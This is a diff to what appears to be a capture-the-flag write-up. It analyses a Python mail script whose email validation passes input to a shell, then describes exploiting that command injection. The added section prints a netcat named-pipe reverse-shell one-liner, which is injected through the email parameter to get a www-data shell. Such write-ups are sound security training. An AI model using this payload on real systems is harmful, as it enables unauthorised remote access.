@@ -81,7 +81,7 @@ And, finally I got the response. But in this source code file I observed an unus
 
 I thought this import "form" must be there in the same directory so I checked that file as well & got the source code of the file:
 
-![image](https://user-images.githubusercontent.com/87700008/234574197-9d33a459-6d83-4bd9-89f3-cc86853c3f38.png)
+![image](https://user-images.githubusercontent.com/87700008/234576700-b2e1fdc5-e877-4fff-97f2-395a546f2e65.png)
 
 Here is the source code of the file:
 ```
@@ -157,3 +157,35 @@ def sendmessage(email, subject, message, ip):
 	else:
 		return status
 ```
+
+### Code Analysis:
+
+```
+Code appears to be a Python script for sending an email message using the smtplib library.
+The 'issecure()' function checks if the email address is valid using a regular expression.
+Also, 'issecure()' function uses the 'run()' function to execute shell commands. This could potentially allow for command injection attacks if the domain variable is not properly sanitized.
+The regular expression used to validate email addresses is not very strict and could potentially allow for invalid email addresses to pass through.
+```
+
+### Initial access:
+
+Now, I have discovered the vulnerability by going through the source code in the send message part it's time to exploit it & get the reverse shell.
+This is the request part when I was checking the send message functionality :
+
+![image](https://user-images.githubusercontent.com/87700008/234578655-95edfce7-dd90-496c-821d-11e22b099a9c.png)
+
+Since the domain variable is not properly sanatized & e-mail address is not very stict we can inject our payload in the e-mail parameter.
+
+I tried multiple payloads options but I found this paylod gave the the reverse shell:
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc IP Port >/tmp/f
+```
+
+I added the payload after the e-mail address using the pipe & encoded it in URL format:
+
+![image](https://user-images.githubusercontent.com/87700008/234580735-40a623a9-5c7d-46fb-98ec-b7b8d88df9f7.png)
+
+And, finally I received the shell, with the www-data user (pwn3d🙂!):
+
+![image](https://user-images.githubusercontent.com/87700008/234581090-1a5947c4-398d-4839-92e1-659badd81f85.png)
+
